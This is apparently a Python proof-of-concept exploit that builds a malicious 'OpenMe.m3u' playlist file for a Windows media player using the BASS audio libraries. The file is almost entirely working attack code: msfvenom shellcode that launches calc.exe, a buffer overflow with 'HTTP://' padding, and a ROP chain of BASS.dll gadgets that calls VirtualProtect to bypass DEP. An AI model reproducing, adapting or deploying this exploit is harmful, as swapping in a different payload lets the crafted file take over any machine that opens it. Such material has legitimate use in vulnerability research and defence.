#!/usr/bin/env python

import struct
import time

#root@kali:~# msfvenom -p windows/exec CMD=calc.exe -b "\x00\x09\x0a\x0d\x1a" -f python -v shellcode (227 bytes)
 
shellcode  = ""
shellcode += "\xbb\xc7\x16\xe0\xde\xda\xcc\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
shellcode += "\x33\x83\xc0\x04\x31\x58\x0e\x03\x9f\x18\x02\x2b\xe3\xcd\x4b"
shellcode += "\xd4\x1b\x0e\x2c\x5c\xfe\x3f\x7e\x3a\x8b\x12\x4e\x48\xd9\x9e"
shellcode += "\x25\x1c\xc9\x15\x4b\x89\xfe\x9e\xe6\xef\x31\x1e\xc7\x2f\x9d"
shellcode += "\xdc\x49\xcc\xdf\x30\xaa\xed\x10\x45\xab\x2a\x4c\xa6\xf9\xe3"
shellcode += "\x1b\x15\xee\x80\x59\xa6\x0f\x47\xd6\x96\x77\xe2\x28\x62\xc2"
shellcode += "\xed\x78\xdb\x59\xa5\x60\x57\x05\x16\x91\xb4\x55\x6a\xd8\xb1"
shellcode += "\xae\x18\xdb\x13\xff\xe1\xea\x5b\xac\xdf\xc3\x51\xac\x18\xe3"
shellcode += "\x89\xdb\x52\x10\x37\xdc\xa0\x6b\xe3\x69\x35\xcb\x60\xc9\x9d"
shellcode += "\xea\xa5\x8c\x56\xe0\x02\xda\x31\xe4\x95\x0f\x4a\x10\x1d\xae"
shellcode += "\x9d\x91\x65\x95\x39\xfa\x3e\xb4\x18\xa6\x91\xc9\x7b\x0e\x4d"
shellcode += "\x6c\xf7\xbc\x9a\x16\x5a\xaa\x5d\x9a\xe0\x93\x5e\xa4\xea\xb3"
shellcode += "\x36\x95\x61\x5c\x40\x2a\xa0\x19\xbe\x60\xe9\x0b\x57\x2d\x7b"
shellcode += "\x0e\x3a\xce\x51\x4c\x43\x4d\x50\x2c\xb0\x4d\x11\x29\xfc\xc9"
shellcode += "\xc9\x43\x6d\xbc\xed\xf0\x8e\x95\x8d\x97\x1c\x75\x7c\x32\xa5"
shellcode += "\x1c\x80"

buffer = "HTTP://" + "\x41" * 1005

###   ROP Chain for VirtualProtect()   ###
#========================================#

### stack pivot
buffer += struct.pack('<L', 0x1003a084)  # RETN (ROP NOP) [BASS.dll]

### edx = NewProtect (0x40)
buffer += struct.pack('<L', 0x10015f82)  # POP EAX # RETN [BASS.dll]
buffer += struct.pack('<L', 0xffffffc0)  # value to negate, will become 0x00000040
buffer += struct.pack('<L', 0x10014db4)  # NEG EAX # RETN [BASS.dll]
buffer += struct.pack('<L', 0x10038a6d)  # XCHG EAX,EDX # RETN [BASS.dll]

### ebx = dwSize (501)
buffer += struct.pack('<L', 0x10015f82)  # POP EAX # RETN [BASS.dll]
buffer += struct.pack('<L', 0xfffffaff)  # value to negate, will become 0x00000501
buffer += struct.pack('<L', 0x10014db4)  # NEG EAX # RETN [BASS.dll]
buffer += struct.pack('<L', 0x10032f72)  # XCHG EAX,EBX # RETN 0x00 [BASS.dll]

### eax = ptr to &VirtualProtect()
buffer += struct.pack('<L', 0x10015f82)  # POP EAX # RETN [BASS.dll]               
buffer += struct.pack('<L', 0x1060e25c)  # ptr to &VirtualProtect() [BASSMIDI.dll]

### ecx = lpOldProtect (ptr to writeable address)
buffer += struct.pack('<L', 0x101049ec)  # POP ECX # RETN [BASSWMA.dll] 
buffer += struct.pack('<L', 0x101082db)  # &Writable location [BASSWMA.dll]

### esp = lPAddress (automatic) aka shellcode

### ebp = pop 4 bytes
buffer += struct.pack('<L', 0x10010157)  # POP EBP # RETN [BASS.dll] 
buffer += struct.pack('<L', 0x10010157)  # skip 4 bytes [BASS.dll]

### esi = ptr to jmp [eax]
buffer += struct.pack('<L', 0x1001d804)  # POP ESI # RETN [BASS.dll]
buffer += struct.pack('<L', 0x10101c02)  # JMP [EAX] [BASSWMA.dll]

### edi = ROP NOP (RETN)
buffer += struct.pack('<L', 0x100190b0)  # POP EDI # RETN [BASS.dll]
buffer += struct.pack('<L', 0x1003a084)  # RETN (ROP NOP) [BASS.dll]

### push register values to poor stack
buffer += struct.pack('<L', 0x1001d7a5)  # PUSHAD # RETN [BASS.dll]
buffer += struct.pack('<L', 0x1010539f)  # jmp esp in BASSWMA.dll universal

buffer += "\x90" * 20                    # make space for shellcode decoder
buffer += shellcode                      # evil calc.exe 

### padding
buffer += "\x43" * (20000-7-1005-(4*21)-20-len(shellcode))

try:
	f=open("OpenMe.m3u","w")
	print "[+] Creating %s bytes evil payload.." %len(buffer)
	time.sleep(1)
	f.write(buffer)
	f.close()
	print "[+] File created. Load that shit up!"
except:
	print "File cannot be created"